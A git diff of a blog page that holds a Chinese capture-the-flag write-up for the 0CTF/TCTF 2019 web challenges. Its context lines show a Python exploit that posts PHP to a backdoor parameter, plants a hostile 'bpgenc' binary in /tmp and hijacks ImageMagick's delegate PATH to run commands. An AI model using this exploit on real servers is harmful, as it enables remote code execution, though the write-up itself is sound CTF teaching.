@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032609.png?raw=true">
 <meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032610.png?raw=true">
 <meta property="og:image" content="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032611.png?raw=true">
-<meta property="og:updated_time" content="2019-03-26T13:40:13.939Z">
+<meta property="og:updated_time" content="2019-03-26T13:42:53.246Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0CTF&#x2F;TCTF2019 Web题解">
 <meta name="twitter:description" content="前言这次的CTF比赛虽然只有两道Web题，但是难度还是有的，用到的知识点也很有趣，而菜鸡的我在群内大师傅的提点下总算是把题目给做出来了，这里总结一下。">
@@ -162,7 +162,7 @@
 <p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032609.png?raw=true" alt=""></p>
 <p>在寻找漏洞之前，我们可以先看一下16年的ImageMagick漏洞详情：<a href="https://www.2cto.com/article/201605/505823.html" target="_blank" rel="noopener">https://www.2cto.com/article/201605/505823.html</a></p>
 <p>漏洞原因是ImageMagick在处理文件的时候，底层会使用system或者execve调用相应的二进制程序来实现功能，而因为对输入变量的处理不够妥善，就导致了命令注入漏洞。新版本的ImageMagick则通过两种或更多的方式来修复了：禁止了一些delegate、在处理输入输出前先创建随机文件名的文件副本。</p>
-<p>现在命令注入是行不通了，但是还有一个问题，观察delegate的command，ImageMagick在调用二进制文件的时候，似乎没有写上他们的绝对路径？我们选用第一个delegate（\<delegate decode="bpg" command="&quot;@BPGDecodeDelegate@&quot; -b 16 -o &quot;%o.png&quot; &quot;%i&quot;; @MVDelegate@ &quot;%o.png&quot; &quot;%o&quot;">），用strace调试一下看看，命令：</delegate></p>
+<p>现在命令注入是行不通了，但是还有一个问题，观察delegate的command，ImageMagick在调用二进制文件的时候，似乎没有写上他们的绝对路径？我们选用第一个delegate（delegate decode=”bpg” command=”&quot;@BPGDecodeDelegate@&quot; -b 16 -o &quot;%o.png&quot; &quot;%i&quot;; @MVDelegate@ &quot;%o.png&quot; &quot;%o&quot;”），用strace调试一下看看，命令：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strace -f php Twings.php 2&gt;&amp;1 | grep bpgdec</span><br></pre></td></tr></table></figure>
 <p>Twings.php：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$image = new Imagick(&apos;Sun.bpg&apos;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
@@ -176,7 +176,7 @@
 <p>运行php Twings.php，可以看到：</p>
 <p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032610.png?raw=true" alt=""></p>
 <p>成功了！</p>
-<h4 id="解题流程-1"><a href="#解题流程-1" class="headerlink" title="解题流程"></a>解题流程</h4><p>直接贴脚本，我使用的是第二个delegate（\<delegate decode="png" encode="bpg" command="&quot;@BPGEncodeDelegate@&quot; -b 12 -sstdout=%%stderr &quot;%Q&quot; -o &quot;%o&quot; &quot;%i&quot;">），即调用了bpgenc的delegate：</delegate></p>
+<h4 id="解题流程-1"><a href="#解题流程-1" class="headerlink" title="解题流程"></a>解题流程</h4><p>直接贴脚本，我使用的是第二个delegate（delegate decode=”png” encode=”bpg” command=”&quot;@BPGEncodeDelegate@&quot; -b 12 -sstdout=%%stderr &quot;%Q&quot; -o &quot;%o&quot; &quot;%i&quot;”），即调用了bpgenc的delegate：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">import base64</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://111.186.63.208:31340/&quot;</span><br><span class="line">evil = open(&quot;bpgenc&quot;, &quot;rb&quot;).read()</span><br><span class="line">evil = base64.b64encode(evil)</span><br><span class="line">php = &quot;putenv(&apos;PATH=/tmp/40f955f039eabe222958ff57ac1bfdbb&apos;);&quot; \</span><br><span class="line">      &quot;file_put_contents(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/bpgenc&apos;, base64_decode(&apos;&quot; + evil + &quot;&apos;));&quot; \</span><br><span class="line">      &quot;chmod(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/bpgenc&apos;, 0777);&quot; \</span><br><span class="line">      &quot;$image = new Imagick(&apos;http://*.*.*.*/sun.png&apos;);&quot; \</span><br><span class="line">      &quot;$image -&gt; writeImage(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/a.bpg&apos;);&quot; \</span><br><span class="line">      &quot;echo file_get_contents(&apos;/tmp/40f955f039eabe222958ff57ac1bfdbb/Pwn&apos;);&quot;</span><br><span class="line">data = &#123;</span><br><span class="line">    &quot;backdoor&quot;: php</span><br><span class="line">&#125;</span><br><span class="line">print requests.post(url, data=data).content</span><br></pre></td></tr></table></figure>
 <p>结果：</p>
 <p><img src="https://github.com/Aluvion/aluvion.github.io/blob/master/css/images/0CTF2019/2019032611.png?raw=true" alt=""></p>
@@ -197,7 +197,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2019/03/26/0CTF-TCTF-Web题解/" data-id="cjtptvek70005qov63ky4eu7y" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2019/03/26/0CTF-TCTF-Web题解/" data-id="cjtptyl4t0000j8v67relgqpw" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li></ul>
